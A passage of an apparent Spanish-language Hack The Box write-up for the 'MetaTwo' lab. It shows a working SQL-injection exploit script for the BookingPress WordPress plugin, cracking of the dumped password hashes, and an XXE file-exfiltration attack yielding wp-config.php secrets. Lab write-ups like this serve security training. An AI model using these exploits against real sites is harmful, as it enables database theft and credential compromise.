fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>❯ curl <span class="nt">-si</span> <span class="s1">'http://metapress.htb/wp-admin/admin-ajax.php'</span> <span class="se">\</span>
<span class="nt">--data</span> <span class="s1">'action=bookingpress_front_get_category_services&amp;_wpnonce=b81f4b63a7&amp;category_id=33&amp;total_service=-1) UNION SELECT 1,2,3,4,5,6,7,8,group_concat(0x7c, version(), 0x7c)-- -'</span>
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Wed, 16 Nov 2022 20:12:41 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.24
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age<span class="o">=</span>0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin

<span class="o">[{</span><span class="s2">"bookingpress_service_id"</span>:<span class="s2">"1"</span>,<span class="s2">"bookingpress_category_id"</span>:<span class="s2">"2"</span>,<span class="s2">"bookingpress_service_name"</span>:<span class="s2">"3"</span>,<span class="s2">"bookingpress_service_price"</span>:<span class="s2">"</span><span class="nv">$4</span><span class="s2">.00"</span>,<span class="s2">"bookingpress_service_duration_val"</span>:<span class="s2">"5"</span>,<span class="s2">"bookingpress_service_duration_unit"</span>:<span class="s2">"6"</span>,<span class="s2">"bookingpress_service_description"</span>:<span class="s2">"7"</span>,<span class="s2">"bookingpress_service_position"</span>:<span class="s2">"8"</span>,<span class="s2">"bookingpress_servicedate_created"</span>:<span class="s2">"|10.5.15-MariaDB-0+deb11u1|"</span>,<span class="s2">"service_price_without_currency"</span>:4,<span class="s2">"img_url"</span>:<span class="s2">"http:</span><span class="se">\/\/</span><span class="s2">metapress.htb</span><span class="se">\/</span><span class="s2">wp-content</span><span class="se">\/</span><span class="s2">plugins</span><span class="se">\/</span><span class="s2">bookingpress-appointment-booking</span><span class="se">\/</span><span class="s2">images</span><span class="se">\/</span><span class="s2">placeholder-img.jpg"</span><span class="o">}]</span>
</pre></table></code></div></div><p>Ahora solo es cuestión de listar la base de datos, así que hice un script en <code class="language-plaintext highlighter-rouge">bash</code> para ello:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># CVE-2022-0739</span>
<span class="c"># -------------</span>
<span class="c"># Description: SQL injection via bookingpress_front_get_category_services AJAX action (unauthenticated users)</span>
<span class="c">#</span>
<span class="c"># Author: Marss</span>
<span class="c"># Date: 08 Nov, 2022</span>


<span class="c"># Ctrl + c</span>
<span class="c"># (function)</span>
signal_handler<span class="o">(){</span>
  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[!] User terminated."</span>
  tput cnorm<span class="p">;</span> <span class="nb">exit </span>1 <span class="c"># return cursor and exit</span>
<span class="o">}</span>

<span class="c"># (signal)</span>
<span class="nb">trap </span>signal_handler SIGINT


<span class="c">## Functions</span>
<span class="c"># Display help panel</span>
help_panel<span class="o">(){</span>
  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">CVE-2022-0739"</span>
  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"-------------"</span>
  <span class="nb">echo
  echo</span> <span class="nt">-e</span> <span class="s2">"[*] Use: </span><span class="nv">$0</span><span class="s2"> -u target_url -d database -t table -c column"</span>
  <span class="nb">echo</span>
<span class="o">}</span>

<span class="c"># extract nonce of target url</span>
extract_nonce<span class="o">(){</span>
  <span class="nb">echo</span> <span class="si">$(</span>curl <span class="nt">-si</span> <span class="s2">"</span><span class="nv">$target_url</span><span class="s2">/events/"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="nt">-m</span> 1 <span class="s2">"_wpnonce:'(.*?)'"</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">':'</span> <span class="s1">'{print $2}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"'</span><span class="se">\n</span><span class="s2">"</span><span class="si">)</span>
<span class="o">}</span>

<span class="c"># query modes</span>
get_databases<span class="o">(){</span>
  <span class="nb">echo</span> <span class="s2">"-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata-- -"</span>
<span class="o">}</span>

get_tables_len<span class="o">(){</span>
  <span class="nv">tables_data</span><span class="o">=</span><span class="s2">"-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema</span><span class="nv">$2</span><span class="s2">-- -"</span>

  <span class="nv">output</span><span class="o">=</span><span class="si">$(</span>make_injection <span class="nv">$1</span> <span class="s2">"</span><span class="nv">$tables_data</span><span class="s2">"</span><span class="si">)</span>
  <span class="nv">tables_len</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$output</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s1">','</span> <span class="s1">'{print NF}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span><span class="si">)</span>
  
  <span class="nb">echo</span> <span class="nv">$tables_len</span>
<span class="o">}</span>
get_tables<span class="o">(){</span>
  <span class="nb">echo</span> <span class="s2">"-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema</span><span class="nv">$1</span><span class="s2"> group by table_name ASC limit 0,</span><span class="nv">$2</span><span class="s2">-- -"</span>
<span class="o">}</span>

get_table_number<span class="o">(){</span>
  <span class="nv">table_number</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$2</span> | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">'\n'</span> | <span class="nb">grep</span> <span class="nt">-n</span> <span class="nv">$1</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">':'</span> <span class="s1">'{print $1}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span><span class="si">)</span>
  <span class="nb">echo</span> <span class="nv">$table_number</span>
<span class="o">}</span>
get_columns<span class="o">(){</span>
  <span class="nb">echo</span> <span class="s2">"1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_schema</span><span class="nv">$1</span><span class="s2"> group by table_name ASC limit </span><span class="nv">$2</span><span class="s2">,1-- -"</span>
<span class="o">}</span>

get_values<span class="o">(){</span>
  <span class="nb">echo</span> <span class="s2">"-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, </span><span class="nv">$1</span><span class="s2">, 0x7c) from </span><span class="nv">$2</span><span class="s2">.</span><span class="nv">$3</span><span class="s2">-- -"</span>
<span class="o">}</span>

<span class="c"># select injection type</span>
get_injection_type<span class="o">(){</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="nv">$database</span> <span class="o">==</span> <span class="s2">"blog"</span> <span class="o">]]</span>
  <span class="k">then
    </span><span class="nv">database_name</span><span class="o">=</span><span class="s2">"=database()"</span>
  <span class="k">else
    </span><span class="nv">database_name</span><span class="o">=</span><span class="s2">"!=database()"</span>
  <span class="k">fi

  if</span> <span class="o">[[</span> <span class="nv">$target_url</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nv">$database</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nv">$table</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nv">$column</span> <span class="o">]]</span>
  <span class="k">then
    </span>get_databases

  <span class="k">elif</span> <span class="o">[[</span> <span class="nv">$target_url</span> <span class="o">&amp;&amp;</span> <span class="nv">$database</span> <span class="o">&amp;&amp;</span> <span class="nv">$table</span> <span class="o">&amp;&amp;</span> <span class="nv">$column</span> <span class="o">]]</span>
  <span class="k">then
    </span>get_values <span class="nv">$column</span> <span class="nv">$database</span> <span class="nv">$table</span>

  <span class="k">elif</span> <span class="o">[[</span> <span class="nv">$target_url</span> <span class="o">&amp;&amp;</span> <span class="nv">$database</span> <span class="o">&amp;&amp;</span> <span class="nv">$table</span> <span class="o">]]</span>
  <span class="k">then 
    </span><span class="nv">tables_len</span><span class="o">=</span><span class="si">$(</span>get_tables_len <span class="nv">$user_nonce</span> <span class="nv">$database_name</span><span class="si">)</span>
    <span class="nv">tables_injection</span><span class="o">=</span><span class="si">$(</span>get_tables <span class="nv">$database_name</span> <span class="nv">$tables_len</span><span class="si">)</span>
    <span class="nv">tables_output</span><span class="o">=</span><span class="si">$(</span>make_injection <span class="nv">$user_nonce</span> <span class="s2">"</span><span class="nv">$tables_injection</span><span class="s2">"</span><span class="si">)</span>

    <span class="nv">table_number</span><span class="o">=</span><span class="si">$(</span>get_table_number <span class="nv">$table</span> <span class="s2">"</span><span class="nv">$tables_output</span><span class="s2">"</span><span class="si">)</span>

    <span class="nv">output</span><span class="o">=</span><span class="si">$(</span>get_columns <span class="nv">$database_name</span> <span class="nv">$table_number</span><span class="si">)</span>
    <span class="nb">echo</span> <span class="nv">$output</span> 

  <span class="k">elif</span> <span class="o">[[</span> <span class="nv">$target_url</span> <span class="o">&amp;&amp;</span> <span class="nv">$database</span> <span class="o">]]</span>
  <span class="k">then  
    </span><span class="nv">tables_len</span><span class="o">=</span><span class="si">$(</span>get_tables_len <span class="nv">$user_nonce</span> <span class="nv">$database_name</span><span class="si">)</span>

    get_tables <span class="nv">$database_name</span> <span class="nv">$tables_len</span>
  <span class="k">fi</span>
<span class="o">}</span>

<span class="c"># insert sql injection</span>
make_injection<span class="o">(){</span>
  <span class="nv">user_nonce</span><span class="o">=</span><span class="nv">$1</span>
  <span class="nv">payload_injection</span><span class="o">=</span><span class="nv">$2</span>
  
  <span class="nb">echo</span> <span class="si">$(</span>curl <span class="nt">-s</span> <span class="s2">"</span><span class="nv">$target_url</span><span class="s2">/wp-admin/admin-ajax.php"</span> <span class="se">\</span>
  <span class="nt">--data</span> <span class="s2">"action=bookingpress_front_get_category_services&amp;_wpnonce=</span><span class="nv">$user_nonce</span><span class="s2">&amp;category_id=1&amp;total_service=</span><span class="nv">$payload_injection</span><span class="s2">"</span> <span class="se">\</span>
  | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\"\|</span><span class="s2">(.*?)</span><span class="se">\|\"</span><span class="s2">"</span><span class="si">)</span>
<span class="o">}</span>

<span class="c"># start sql injection attack</span>
start_attack<span class="o">(){</span>

  <span class="nv">user_nonce</span><span class="o">=</span><span class="si">$(</span>extract_nonce<span class="si">)</span>

  <span class="nv">payload_injection</span><span class="o">=</span><span class="si">$(</span>get_injection_type<span class="si">)</span>

  <span class="nv">output</span><span class="o">=</span><span class="si">$(</span>make_injection <span class="nv">$user_nonce</span> <span class="s2">"</span><span class="nv">$payload_injection</span><span class="s2">"</span><span class="si">)</span>
  <span class="nb">echo
  echo</span> <span class="nv">$output</span> | <span class="nb">tr</span> <span class="s1">','</span> <span class="s1">' '</span> | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">'\n'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span>
  <span class="nb">echo</span>
<span class="o">}</span>

<span class="c">## Main flow</span>
<span class="c"># No arguments</span>
<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
<span class="k">then
  </span>help_panel
  <span class="nb">exit </span>1
<span class="k">fi

</span>tput civis <span class="c"># hide cursor</span>

<span class="c"># Valid options</span>
<span class="k">while </span><span class="nb">getopts</span> <span class="s2">":hu:d:t:c:"</span> option
<span class="k">do
  case</span> <span class="nv">$option</span> <span class="k">in
    </span>h<span class="p">)</span> <span class="c"># display help panel</span>
      help_panel 
      tput cnorm<span class="p">;</span> <span class="nb">exit</span><span class="p">;;</span>
    u<span class="p">)</span> <span class="c"># save target url</span>
      <span class="nv">target_url</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="p">;;</span>
    d<span class="p">)</span> <span class="c"># save database name</span>
      <span class="nv">database</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="p">;;</span>
    t<span class="p">)</span> <span class="c"># save table name</span>
      <span class="nv">table</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="p">;;</span>
    c<span class="p">)</span> <span class="c"># save column name</span>
      <span class="nv">column</span><span class="o">=</span><span class="nv">$OPTARG</span><span class="p">;;</span>
    <span class="se">\?</span><span class="p">)</span> <span class="c"># invalid option</span>
      <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[x] Error: Invalid option."</span>
      tput cnorm<span class="p">;</span> <span class="nb">exit</span><span class="p">;;</span>
  <span class="k">esac</span>
<span class="k">done</span><span class="p">;</span> tput cnorm <span class="c"># return cursor</span>

<span class="c"># insert injection to target url</span>
start_attack
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_MetaTwo">https://github.com/E1P0TR0</a></p></div></blockquote><p>Ahora ejecutamos el script y conseguimos el hash de las contraseñas del usuario <code class="language-plaintext highlighter-rouge">admin</code> y <code class="language-plaintext highlighter-rouge">manager</code>:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>❯ bash sql_injection.sh <span class="nt">-u</span> <span class="s2">"http://metapress.htb"</span> <span class="nt">-d</span> <span class="s2">"blog"</span> <span class="nt">-t</span> <span class="s2">"wp_users"</span> <span class="nt">-c</span> <span class="s2">"user_pass"</span>

|<span class="nv">$P$BGrGrgf2wToBS79i07Rk9sN4Fzk</span>.TV.|
|<span class="nv">$P$B4aNM28N0E</span>.tMy<span class="se">\/</span>JIcnVMZbGcU16Q70|
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>El prefix <code class="language-plaintext highlighter-rouge">$P$</code> corresponse al tipo de hash <code class="language-plaintext highlighter-rouge">PHPass</code>, él cual usa <code class="language-plaintext highlighter-rouge">Wordpress</code> para mayor protección en sus contraseñas</p></div></blockquote><p>Ya que disponemos de hashes, lo que hacemos es usar <code class="language-plaintext highlighter-rouge">John the Ripper</code> para crackearlas:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="go">❯ cat dumb_hashes
───────┬───────────────────────────────────────────────────────────────────────────────────────────
       │ File: dumb_hashes
───────┼───────────────────────────────────────────────────────────────────────────────────────────
</span><span class="gp">   1   │ admin:$</span>P<span class="nv">$BGrGrgf2wToBS79i07Rk9sN4Fzk</span>.TV.
<span class="gp">   2   │ manager:$</span>P<span class="nv">$B4aNM28N0E</span>.tMy/JIcnVMZbGcU16Q70
<span class="go">───────┴───────────────────────────────────────────────────────────────────────────────────────────

❯ john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt dumb_hashes
Using default input encoding: UTF-8
</span><span class="gp">Loaded 2 password hashes with 2 different salts (phpass [phpass ($</span>P<span class="nv">$ </span>or <span class="nv">$H$)</span> 256/256 AVX2 8x3]<span class="o">)</span>
<span class="go">Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (manager)     
1g 0:00:00:58 10.34% (ETA: 16:11:53) 0.01720g/s 28378p/s 30281c/s 30281C/s junabhe..jumbo8
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session aborted
</span></pre></table></code></div></div><p>Al final solo consiguimos crackear las credenciales <code class="language-plaintext highlighter-rouge">manager:partylikearockstar</code>, y como son de wordpress procedemos a logearnos en <em>wp-login.php</em>:</p><p><img data-src="/assets/img/htb/writeups/metatwo/manager_session.png" alt="http://metapress.htb/wp-admin/profile.php" class="shadow" data-proofer-ignore></p><p>Como ya estamos autenticados y tenemos la version del <code class="language-plaintext highlighter-rouge">Wordpress</code> (fase de enumeración). Al buscar vulnerabilidades como usuarios autenticados y de la versión <code class="language-plaintext highlighter-rouge">5.6.2</code>, encontramos lo siguiente:</p><blockquote><p><a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">CVE-2021-29447</a></p></blockquote><p><img data-src="/assets/img/htb/writeups/metatwo/CVE-2021-29447.png" alt="CVE-2021-29447" data-proofer-ignore></p><p>En resumen, gracias a que la funcionalidad de la subida de archivos <code class="language-plaintext highlighter-rouge">.wav</code> es vulnerable a una inyección <strong>XML external entity (XXE)</strong>, podemos extraer archivos importantes del sistema.</p><p>Debemos tener lo siguiente:</p><ol><li>Archivo <code class="language-plaintext highlighter-rouge">.dtd</code> (Document Type Definition) con lenguaje XML que a nivel de sistema, por medio de wrapper de php, extraiga el archivo que solicitemos y luego realize una petición a nosotros usando como parámetro de la solicitud el archivo anteriormente requerido<li>Archivo <code class="language-plaintext highlighter-rouge">.wav</code> con código XML inyectado para que ejecute en el sistema una petición hacia nuestro archivo <code class="language-plaintext highlighter-rouge">.dtd</code><li>Abrir un servidor para compartir nuestro archivo y ver las peticiones que nos realizará la máquina objetivo</ol><blockquote class="prompt-info"><div><p>Para una explicación más detallada sobre la explotación de esta vulnerabilidad te recomiendo el siguiente articulo: <a href="https://www.pinguytaz.net/index.php/2021/09/04/cve-2021-29447-vulnerabilidad-xxe-wordpress-ctf/">https://www.pinguytaz.net/index.php/2021/09/04/cve-2021-29447-vulnerabilidad-xxe-wordpress-ctf/</a></p></div></blockquote><p>Después de diseñar bien nuestros archivos intentamos extraer el archivo de configuración de <code class="language-plaintext highlighter-rouge">Wordpress</code> <em>wp-config.php</em>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.186 - - [16/Nov/2022 16:39:18] "GET /poc.dtd HTTP/1.1" 200 -
10.10.11.186 - - [16/Nov/2022 16:39:18] "GET /?PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== HTTP/1.1" 200 -
10.10.11.186 - - [16/Nov/2022 16:39:18] "GET /poc.dtd HTTP/1.1" 200 -
. . .
</span></pre></table></code></div></div><p>Desencriptamos la data en <code class="language-plaintext highlighter-rouge">base64</code> y conseguimos el archivo <code class="language-plaintext highlighter-rouge">wp-config.php</code>:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="cd">/** The name of the database for WordPress */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'blog'</span> <span class="p">);</span>

<span class="cd">/** MySQL database username */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'blog'</span> <span class="p">);</span>

<span class="cd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'635Aq@TdqrCwXFUZ'</span> <span class="p">);</span>

<span class="cd">/** MySQL hostname */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>

<span class="cd">/** Database Charset to use in creating database tables. */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_CHARSET'</span><span class="p">,</span> <span class="s1">'utf8mb4'</span> <span class="p">);</span>

<span class="cd">/** The Database Collate type. Don't change this if in doubt. */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_COLLATE'</span><span class="p">,</span> <span class="s1">''</span> <span class="p">);</span>

<span class="nb">define</span><span class="p">(</span> <span class="s1">'FS_METHOD'</span><span class="p">,</span> <span class="s1">'ftpext'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'FTP_USER'</span><span class="p">,</span> <span class="s1">'metapress.htb'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'FTP_PASS'</span><span class="p">,</span> <span class="s1">'9NYS_ii@FyL_p5M2NvJ'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'FTP_HOST'</span><span class="p">,</span> <span class="s1">'ftp.metapress.htb'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'FTP_BASE'</span><span class="p">,</span> <span class="s1">'blog/'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'FTP_SSL'</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>

<span class="cd">/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'AUTH_KEY'</span><span class="p">,</span>         <span class="s1">'?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'SECURE_AUTH_KEY'</span><span class="p">,</span>  <span class="s1">'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'LOGGED_IN_KEY'</span><span class="p">,</span>    <span class="s1">'J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'NONCE_KEY'</span><span class="p">,</span>        <span class="s1">'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'AUTH_SALT'</span><span class="p">,</span>        <span class="s1">'[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D'</span> <span class="p">);</span>
